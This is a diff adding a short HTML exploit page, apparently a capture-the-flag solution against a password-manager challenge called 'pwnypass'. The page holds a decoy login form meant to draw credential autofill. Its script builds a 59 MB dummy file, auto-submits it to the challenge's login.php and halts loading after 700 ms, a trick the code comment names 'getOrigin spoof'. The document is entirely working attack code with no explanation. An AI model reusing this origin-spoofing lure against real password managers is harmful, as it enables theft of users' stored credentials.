@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>x</title>
+</head>
+<body>
+
+<form method="POST" id="credForm">
+	<input name="username" type="text" id="usernameField">
+	<input name="password" type="password" id="passwordField">
+	<input name="submit" type="submit">
+</form>
+
+<form id="bigform" enctype="multipart/form-data" action="https://pwnypass.c.hc.lc/login.php" method="POST">
+	<input type=file id=fileinp name=lol>
+</form>
+
+<script>
+// getOrigin spoof
+
+let lmao = new DataTransfer();
+lmao.items.add(new File(["a".repeat(59388419)], "lol"));
+fileinp.files = lmao.files;
+
+setTimeout(() => bigform.submit(), 10);
+setTimeout(() => window.stop(), 700);
+</script>
+
+</body>
+</html>
